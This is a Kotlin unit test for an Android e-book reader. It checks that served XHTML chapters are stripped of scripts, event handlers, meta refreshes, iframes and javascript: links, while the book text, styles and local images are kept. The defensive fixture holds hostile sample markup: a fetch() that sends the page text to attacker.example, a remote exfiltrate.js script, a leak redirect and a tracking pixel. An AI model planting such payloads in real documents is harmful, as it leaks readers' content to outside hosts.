package app.peekturn.reader.reader

import kotlinx.coroutines.test.runTest
import org.jsoup.Jsoup
import org.junit.Assert.*
import org.junit.Test
import org.readium.r2.shared.util.Url
import org.readium.r2.shared.util.data.Container
import org.readium.r2.shared.util.mediatype.MediaType
import org.readium.r2.shared.util.resource.InMemoryResource
import org.readium.r2.shared.util.resource.Resource

@org.junit.runner.RunWith(org.robolectric.RobolectricTestRunner::class)
class PublicationContentPolicyTest {
    @Test fun `served XHTML removes author capabilities while preserving original archive and static layout`() = runTest {
        val source = """<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
            <title>Original book title</title><base href="https://attacker.example/"/>
            <meta http-equiv="refresh" content="0;url=https://attacker.example/leak"/>
            <link rel="stylesheet" href="book.css"/>
            <script src="https://attacker.example/exfiltrate.js"></script>
            <script src="author.js"></script>
            <script>fetch('https://attacker.example/' + document.body.textContent)</script>
            </head><body><h1 id="chapter" style="font-style:italic">Chapter one</h1>
            <p onclick="Android.onSelectionStart()">Actual <em>nested</em> book text.</p>
            <img src="local-cover.png"/><img src="https://attacker.example/tracker.png"/>
            <iframe src="active.xhtml"></iframe><a href="javascript:Android.onSelectionStart()">Unsafe</a>
            </body></html>"""
        val chapter = Url("OEBPS/chapter.xhtml")!!
        val css = Url("OEBPS/book.css")!!
        val originalHtml = source.toByteArray()
        val originalCss = "p { font-style: italic; }".toByteArray()
        val original = MemoryPublication(mapOf(chapter to originalHtml, css to originalCss))
        val protected = securePublicationContainer(original, mapOf(chapter to MediaType.XHTML))
        val served = protected[chapter]!!
        val servedBytes = served.read().getOrNull()!!
        val document = Jsoup.parse(servedBytes.toString(Charsets.UTF_8))
        assertTrue(document.select("script").isEmpty())
        assertFalse(document.selectFirst("p")!!.hasAttr("onclick"))
        assertTrue(document.select("base,meta[http-equiv=refresh],iframe").isEmpty())
        assertFalse(document.selectFirst("a")!!.hasAttr("href"))
        assertEquals("Original book title", document.title())
        assertEquals("Actual nested book text.", document.selectFirst("p")!!.text())
        assertEquals("font-style:italic", document.selectFirst("#chapter")!!.attr("style"))
        assertNotNull(document.selectFirst("link[href=book.css]"))
        assertNotNull(document.selectFirst("img[src=local-cover.png]"))
        assertNotNull(document.selectFirst("meta[http-equiv=Content-Security-Policy]"))
        assertArrayEquals(originalCss, protected[css]!!.read().getOrNull())
        assertArrayEquals(source.toByteArray(), original.originals.getValue(chapter))
        assertArrayEquals(servedBytes.copyOfRange(0, 10), served.read(0L..9L).getOrNull())
        protected.close()
        assertEquals(1, original.closeCount)
    }

    private class MemoryPublication(val originals: Map<Url, ByteArray>) : Container<Resource> {
        override val entries: Set<Url> get() = originals.keys
        var closeCount = 0
        override fun get(url: Url): Resource? = originals[url]?.let { InMemoryResource(it) }
        override fun close() { closeCount++ }
    }
}
